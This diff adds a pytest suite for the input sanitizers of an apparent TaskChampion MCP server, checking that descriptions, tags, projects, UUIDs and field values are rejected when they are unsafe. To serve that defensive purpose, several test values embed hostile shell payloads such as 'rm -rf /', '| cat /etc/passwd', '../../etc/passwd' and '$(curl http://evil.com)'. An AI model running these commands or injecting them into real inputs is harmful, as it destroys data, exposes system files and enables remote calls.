@@ -1,0 +1,257 @@
+"""Tests for input sanitization (ADR 9)."""
+
+from __future__ import annotations
+
+import json
+from pathlib import Path
+
+import pytest
+
+from taskchampion_mcp.sanitizer import (
+    SanitizationError,
+    sanitize_annotation,
+    sanitize_description,
+    sanitize_enum,
+    sanitize_field_value,
+    sanitize_project,
+    sanitize_tag,
+    sanitize_uuid,
+)
+
+FIXTURES = Path(__file__).parent / "fixtures"
+
+
+# ---------------------------------------------------------------------------
+# Description
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeDescription:
+    def test_valid(self):
+        assert sanitize_description("Fix the login bug") == "Fix the login bug"
+
+    def test_strips_whitespace(self):
+        assert sanitize_description("  hello  ") == "hello"
+
+    def test_empty_raises(self):
+        with pytest.raises(SanitizationError, match="empty"):
+            sanitize_description("")
+
+    def test_whitespace_only_raises(self):
+        with pytest.raises(SanitizationError, match="empty"):
+            sanitize_description("   ")
+
+    def test_too_long_raises(self):
+        with pytest.raises(SanitizationError, match="maximum length"):
+            sanitize_description("x" * 5000)
+
+    def test_null_byte_raises(self):
+        with pytest.raises(SanitizationError, match="null bytes"):
+            sanitize_description("hello\x00world")
+
+    def test_shell_meta_semicolon(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_description('Fix bug"; rm -rf / #')
+
+    def test_shell_meta_backtick(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_description("Update `$(whoami)` user")
+
+    def test_shell_meta_pipe(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_description("task | cat /etc/passwd")
+
+    def test_shell_meta_dollar(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_description("Deploy to $HOME/.ssh")
+
+    def test_control_chars_raise(self):
+        with pytest.raises(SanitizationError, match="control characters"):
+            sanitize_description("hello\x01world")
+
+
+# ---------------------------------------------------------------------------
+# Annotation
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeAnnotation:
+    def test_valid(self):
+        assert sanitize_annotation("See issue #42") == "See issue #42"
+
+    def test_empty_raises(self):
+        with pytest.raises(SanitizationError, match="empty"):
+            sanitize_annotation("")
+
+    def test_shell_meta_raises(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_annotation("$(curl http://evil.com)")
+
+
+# ---------------------------------------------------------------------------
+# Tag
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeTag:
+    def test_valid(self):
+        assert sanitize_tag("python") == "python"
+
+    def test_strips_plus(self):
+        assert sanitize_tag("+docker") == "docker"
+
+    def test_dots_and_hyphens(self):
+        assert sanitize_tag("my-tag.v2") == "my-tag.v2"
+
+    def test_invalid_chars_raise(self):
+        with pytest.raises(SanitizationError):
+            sanitize_tag("| cat /etc/passwd")
+
+    def test_too_long_raises(self):
+        with pytest.raises(SanitizationError):
+            sanitize_tag("a" * 65)
+
+
+# ---------------------------------------------------------------------------
+# Project
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeProject:
+    def test_valid_dotnotation(self):
+        assert sanitize_project("personal.infra.server") == "personal.infra.server"
+
+    def test_empty_raises(self):
+        with pytest.raises(SanitizationError, match="empty"):
+            sanitize_project("")
+
+    def test_injection_raises(self):
+        with pytest.raises(SanitizationError, match="invalid"):
+            sanitize_project("test; rm -rf /home")
+
+    def test_path_traversal_raises(self):
+        with pytest.raises(SanitizationError, match="invalid"):
+            sanitize_project("../../etc/passwd")
+
+    def test_filter_injection_raises(self):
+        with pytest.raises(SanitizationError, match="invalid"):
+            sanitize_project("test +PENDING or +COMPLETED")
+
+    def test_too_many_levels_raises(self):
+        with pytest.raises(SanitizationError, match="levels"):
+            sanitize_project("a.b.c.d.e.f.g")
+
+
+# ---------------------------------------------------------------------------
+# UUID
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeUUID:
+    def test_valid(self):
+        result = sanitize_uuid("A1B2C3D4-E5F6-7890-ABCD-EF1234567890")
+        assert result == "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+
+    def test_invalid_raises(self):
+        with pytest.raises(SanitizationError, match="UUID"):
+            sanitize_uuid("not-a-uuid")
+
+    def test_short_raises(self):
+        with pytest.raises(SanitizationError, match="UUID"):
+            sanitize_uuid("a1b2c3d4")
+
+
+# ---------------------------------------------------------------------------
+# Enum
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeEnum:
+    def test_valid(self):
+        assert sanitize_enum("H", "priority", ["H", "M", "L"]) == "H"
+
+    def test_invalid_raises(self):
+        with pytest.raises(SanitizationError, match="not in allowed"):
+            sanitize_enum("X", "priority", ["H", "M", "L"])
+
+
+# ---------------------------------------------------------------------------
+# Field value
+# ---------------------------------------------------------------------------
+
+
+class TestSanitizeFieldValue:
+    def test_valid(self):
+        assert sanitize_field_value("some value", "hypothesis") == "some value"
+
+    def test_shell_meta_raises(self):
+        with pytest.raises(SanitizationError, match="shell metacharacters"):
+            sanitize_field_value('test\\" && curl evil.com', "hypothesis")
+
+    def test_too_long_raises(self):
+        with pytest.raises(SanitizationError, match="maximum length"):
+            sanitize_field_value("x" * 2000, "field")
+
+
+# ---------------------------------------------------------------------------
+# Injection attempt fixtures
+# ---------------------------------------------------------------------------
+
+
+class TestInjectionFixtures:
+    """Test all injection attempts from the problematic fixtures file."""
+
+    @pytest.fixture()
+    def injection_data(self):
+        path = FIXTURES / "problematic" / "injection_attempts.json"
+        with open(path) as f:
+            return json.load(f)
+
+    def test_all_injections_blocked(self, injection_data):
+        """Every injection attempt must be caught by at least one sanitizer."""
+        for i, case in enumerate(injection_data):
+            desc = case.get("description", "")
+            project = case.get("project", "")
+            tags = case.get("tags", [])
+            hyp = case.get("hypothesis", "")
+            annotations = case.get("annotations", [])
+
+            blocked = False
+
+            try:
+                sanitize_description(desc)
+            except SanitizationError:
+                blocked = True
+
+            if not blocked and project:
+                try:
+                    sanitize_project(project)
+                except SanitizationError:
+                    blocked = True
+
+            if not blocked:
+                for tag in tags:
+                    try:
+                        sanitize_tag(tag)
+                    except SanitizationError:
+                        blocked = True
+                        break
+
+            if not blocked and hyp:
+                try:
+                    sanitize_field_value(hyp, "hypothesis")
+                except SanitizationError:
+                    blocked = True
+
+            if not blocked:
+                for ann in annotations:
+                    ann_text = ann.get("description", "")
+                    try:
+                        sanitize_annotation(ann_text)
+                    except SanitizationError:
+                        blocked = True
+                        break
+
+            assert blocked, (
+                f"Injection attempt #{i} was NOT blocked: {case.get('_comment', 'no comment')}"
+            )
